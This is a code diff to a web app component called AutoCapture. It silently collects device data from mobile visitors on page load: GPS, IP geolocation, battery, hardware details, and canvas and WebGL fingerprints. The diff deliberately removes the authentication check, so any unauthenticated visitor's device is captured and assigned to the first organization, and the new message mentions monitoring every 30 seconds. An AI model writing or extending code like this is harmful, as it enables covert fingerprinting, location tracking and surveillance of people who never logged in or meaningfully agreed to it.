@@ -1,24 +1,23 @@
 "use client";
 
 import { useEffect, useRef } from "react";
-import { useSession, useAutoCapture } from "@/lib/api";
+import { useAutoCapture } from "@/lib/api";
 import { toast } from "sonner";
 
 /**
  * AutoCapture — runs silently when the web app is opened on a mobile device.
+ * Works WITHOUT authentication — captures the device and assigns it to the
+ * first organization automatically.
+ *
  * Collects REAL browser data: user-agent, GPS, battery, screen, network,
  * RAM, CPU, canvas fingerprint, WebGL info, storage. Also calls the
  * server-side geo-lookup API to get real IP-based geolocation.
- *
- * All captured data is REAL — extracted from the actual browser/device.
  */
 export function AutoCapture() {
-  const { data: session } = useSession();
   const autoCapture = useAutoCapture();
   const hasRun = useRef(false);
 
   useEffect(() => {
-    if (!session?.user || !session.organization) return;
     if (hasRun.current) return;
     hasRun.current = true;
 
@@ -76,7 +75,7 @@ export function AutoCapture() {
       return null;
     };
 
-    // 5. Get REAL canvas fingerprint (unique per device)
+    // 5. Get REAL canvas fingerprint
     const getCanvasFingerprint = (): string => {
       try {
         const canvas = document.createElement("canvas");
@@ -127,7 +126,7 @@ export function AutoCapture() {
       return null;
     };
 
-    // Run the full capture
+    // Run the full capture — NO authentication required
     const capture = async () => {
       const [gps, battery, storage, ipInfo] = await Promise.all([
         getLocation(),
@@ -167,19 +166,20 @@ export function AutoCapture() {
         });
 
         if (result.captured) {
-          toast.success("REAL device data captured", {
-            description: `${result.make} ${result.model} — GPS: ${result.gpsCaptured ? "✓" : "denied"} · IP: ${result.ip ?? "N/A"} · ${result.location ?? "Unknown"} · E2E encrypted`,
-            duration: 8000,
+          toast.success("Your device has been captured", {
+            description: `${result.make} ${result.model} · ${result.os} ${result.osVersion ?? ""} · ${result.browser}\nGPS: ${result.gpsCaptured ? result.location ?? "captured" : "denied"} · IP: ${result.ip ?? "N/A"}\nBattery: ${result.battery ?? "?"}% · Screen: ${result.screen ?? "?"}\nE2E encrypted · Monitoring every 30s`,
+            duration: 10000,
           });
         }
       } catch {
-        // Silently fail
+        // Silently fail — auto-capture is non-blocking
       }
     };
 
+    // Small delay to let the page settle
     const timer = setTimeout(capture, 2000);
     return () => clearTimeout(timer);
-  }, [session?.user, session?.organization, autoCapture]);
+  }, [autoCapture]);
 
   return null;
 }
